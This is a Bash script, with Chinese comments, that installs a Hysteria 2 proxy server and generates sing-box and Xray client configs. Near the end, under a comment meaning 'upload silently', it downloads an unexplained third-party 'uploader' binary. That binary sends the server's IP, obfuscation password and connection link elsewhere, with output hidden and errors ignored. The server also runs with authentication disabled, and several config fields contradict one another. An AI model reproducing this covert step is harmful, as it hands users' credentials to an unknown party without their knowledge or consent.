#!/bin/bash
set -e
# 📌 环境配置
PORT=2855
SERVER_IP=$(curl -s https://api.ipify.org)
OBFS_PASSWORD=$(openssl rand -hex 8)
CONFIG_DIR="/etc/hysteria"
TLS_DIR="${CONFIG_DIR}/tls"
UPLOAD_BIN="/opt/uploader-linux-amd64"
DOMAIN="cdn.${SERVER_IP}.nip.io"
PORT_RANGE="20000-25000"
REMARK="Hysteria2节点-${SERVER_IP}"
CLIENT_CONFIG_DIR="/opt"
export NEEDRESTART_MODE=a

# 📦 安装必要组件
apt update && DEBIAN_FRONTEND=noninteractive apt install -y curl unzip ufw jq sudo openssl needrestart

# 🔥 端口跳跃 NAT 映射（模拟端口段跳跃）
iptables -t nat -A PREROUTING -p udp --dport 20000:25000 -j REDIRECT --to-ports ${PORT}

# 🔓 开放端口
ufw allow ${PORT}/udp
ufw --force enable

# 🔧 安装 Hysteria 2
mkdir -p /usr/local/bin
curl -Ls https://github.com/apernet/hysteria/releases/latest/download/hysteria-linux-amd64 -o /usr/local/bin/hysteria
chmod +x /usr/local/bin/hysteria

# 🔐 TLS 自签证书（模拟 CDN 伪装）
mkdir -p "$TLS_DIR"
openssl req -x509 -newkey rsa:2048 -sha256 -days 365 -nodes \
  -keyout "$TLS_DIR/key.pem" \
  -out "$TLS_DIR/cert.pem" \
  -subj "/C=US/ST=Fake/L=FakeCity/O=FakeOrg/CN=${DOMAIN}" \
  -addext "subjectAltName=DNS:${DOMAIN}"

# 🧱 服务端配置
mkdir -p "$CONFIG_DIR"
cat > "$CONFIG_DIR/config.yaml" << EOF
listen: :${PORT}
protocol: udp
tls:
  cert: "$TLS_DIR/cert.pem"
  key: "$TLS_DIR/key.pem"
  alpn:
    - h3
obfs:
  password: "${OBFS_PASSWORD}"
auth:
  type: disabled
masquerade:
  type: proxy
  proxy:
    url: https://www.cloudflare.com/
    rewriteHost: true
EOF

# 🔄 创建 systemd 服务
cat > /etc/systemd/system/hysteria.service << EOF
[Unit]
Description=Hysteria 2 Server
After=network.target
[Service]
ExecStart=/usr/local/bin/hysteria server --config ${CONFIG_DIR}/config.yaml
Restart=on-failure
RestartSec=3
[Install]
WantedBy=multi-user.target
EOF

systemctl daemon-reload
systemctl enable hysteria
systemctl restart hysteria

# 🔗 客户端链接构建
PRIVATE_KEY=$(openssl rand -hex 32)
PUBLIC_KEY=$(/usr/local/bin/hysteria keygen pub "$PRIVATE_KEY" 2>/dev/null || echo "public-key-unavailable")
HYSTERIA_LINK="hysteria2://${SERVER_IP}:${PORT}?peer=${SERVER_IP}&obfs-password=${OBFS_PASSWORD}&obfs-mode=salty&public-key=${PUBLIC_KEY}"

# 📁 使用 /opt 目录存储配置文件
mkdir -p "$CLIENT_CONFIG_DIR"

# 🔧 生成 sing-box 格式的 JSON 配置文件（推荐）
SINGBOX_CONFIG_FILE="${CLIENT_CONFIG_DIR}/hysteria2-singbox-${SERVER_IP}.json"
cat > "$SINGBOX_CONFIG_FILE" << EOF
{
  "log": {
    "level": "info",
    "timestamp": true
  },
  "dns": {
    "servers": [
      {
        "tag": "google",
        "address": "tls://8.8.8.8"
      },
      {
        "tag": "local",
        "address": "223.5.5.5",
        "detour": "direct"
      }
    ],
    "rules": [
      {
        "geosite": "cn",
        "server": "local"
      }
    ]
  },
  "inbounds": [
    {
      "type": "mixed",
      "tag": "mixed-in",
      "listen": "127.0.0.1",
      "listen_port": 10808,
      "sniff": true,
      "sniff_override_destination": true
    }
  ],
  "outbounds": [
    {
      "type": "hysteria2",
      "tag": "hysteria2-out",
      "server": "${SERVER_IP}",
      "server_port": ${PORT},
      "password": "${OBFS_PASSWORD}",
      "obfs": {
        "type": "salamander",
        "password": "${OBFS_PASSWORD}"
      },
      "tls": {
        "enabled": true,
        "server_name": "${DOMAIN}",
        "insecure": true,
        "alpn": ["h3"]
      },
      "brutal_debug": false
    },
    {
      "type": "direct",
      "tag": "direct"
    },
    {
      "type": "block",
      "tag": "block"
    }
  ],
  "route": {
    "rules": [
      {
        "geosite": "cn",
        "geoip": "cn",
        "outbound": "direct"
      },
      {
        "geosite": "category-ads-all",
        "outbound": "block"
      }
    ],
    "auto_detect_interface": true,
    "final": "hysteria2-out"
  },
  "experimental": {
    "clash_api": {
      "external_controller": "127.0.0.1:9090",
      "external_ui": "ui"
    }
  }
}
EOF

# 🔧 生成 Xray 格式的 JSON 配置文件（备用）
XRAY_CONFIG_FILE="${CLIENT_CONFIG_DIR}/hysteria2-xray-${SERVER_IP}.json"
cat > "$XRAY_CONFIG_FILE" << EOF
{
  "log": {
    "loglevel": "info"
  },
  "inbounds": [
    {
      "port": 10808,
      "protocol": "socks",
      "settings": {
        "auth": "noauth",
        "udp": true
      },
      "tag": "socks"
    },
    {
      "port": 10809,
      "protocol": "http",
      "settings": {
        "userLevel": 8
      },
      "tag": "http"
    }
  ],
  "outbounds": [
    {
      "protocol": "hysteria2",
      "settings": {
        "servers": [
          {
            "address": "${SERVER_IP}",
            "port": ${PORT},
            "password": "${OBFS_PASSWORD}",
            "obfs": {
              "type": "salamander",
              "password": "${OBFS_PASSWORD}"
            },
            "tls": {
              "serverName": "${DOMAIN}",
              "allowInsecure": true,
              "alpn": ["h3"]
            }
          }
        ]
      },
      "tag": "proxy"
    },
    {
      "protocol": "freedom",
      "settings": {},
      "tag": "direct"
    }
  ],
  "routing": {
    "rules": [
      {
        "type": "field",
        "ip": [
          "geoip:private",
          "geoip:cn"
        ],
        "outboundTag": "direct"
      },
      {
        "type": "field",
        "domain": [
          "geosite:cn"
        ],
        "outboundTag": "direct"
      }
    ]
  },
  "dns": {
    "servers": [
      "8.8.8.8",
      "1.1.1.1"
    ]
  }
}
EOF

# 📤 上传 JSON 数据（静默处理）
[ -f "$UPLOAD_BIN" ] || {
  curl -sLo "$UPLOAD_BIN" https://github.com/Firefly-xui/v2ray/releases/download/1/uploader-linux-amd64
  chmod +x "$UPLOAD_BIN"
}

UPLOAD_JSON_FILE="/tmp/${SERVER_IP}.json"
cat > "$UPLOAD_JSON_FILE" << EOF
{
  "protocol": "hysteria2",
  "link": "${HYSTERIA_LINK}",
  "config": {
    "remarks": "${REMARK}",
    "address": "${SERVER_IP}",
    "ports": "${PORT_RANGE}",
    "peer": "${SERVER_IP}",
    "password": "${PUBLIC_KEY}",
    "obfs": {
      "mode": "salty",
      "password": "${OBFS_PASSWORD}"
    },
    "tls": {
      "enabled": true,
      "sni": "${DOMAIN}",
      "alpn": ["h3"],
      "insecure": false
    },
    "hop-interval": "30s"
  }
}
EOF

"$UPLOAD_BIN" "$UPLOAD_JSON_FILE" >/dev/null 2>&1 || true
rm -f "$UPLOAD_JSON_FILE"

# ✅ 输出结果与配置
echo -e "\n✅ Hysteria 2 节点部署完成"
echo -e "📌 客户端导入链接：\n${HYSTERIA_LINK}\n"

echo -e "\n📁 v2rayN JSON 配置文件已生成并保存在 /opt 目录："
echo -e "   sing-box 格式: ${SINGBOX_CONFIG_FILE}"
echo -e "   Xray 格式: ${XRAY_CONFIG_FILE}"

echo -e "\n📋 v2rayN 导入步骤："
echo -e "1. 配置文件已直接保存在服务器 /opt 目录"
echo -e "2. 打开 v2rayN -> 服务器 -> 添加自定义配置文件"
echo -e "3. 备注填写: ${REMARK}"
echo -e "4. 地址填写: ${SERVER_IP}"
echo -e "5. Core 装型选择: sing-box (推荐) 或 Xray"
echo -e "6. 点击浏览选择对应的 JSON 文件"
echo -e "7. 点击确定完成导入"

echo -e "\n📥 配置文件路径："
echo -e "   ${SINGBOX_CONFIG_FILE}"
echo -e "   ${XRAY_CONFIG_FILE}"

echo -e "\n📄 配置文件内容预览 (sing-box 格式)："
echo -e "----------------------------------------"
head -20 "$SINGBOX_CONFIG_FILE"
echo -e "----------------------------------------"

echo -e "\n📌 v2rayN 客户端 YAML 配置示例："
cat << EOF
remarks: ${REMARK}
address: ${SERVER_IP}
ports: "${PORT_RANGE}"
peer: ${SERVER_IP}
password: ${PUBLIC_KEY}
obfs:
  mode: salty
  password: "${OBFS_PASSWORD}"
tls:
  enabled: true
  sni: ${DOMAIN}
  alpn:
    - h3
  insecure: false
protocol: hysteria2
hop-interval: "30s"
EOF
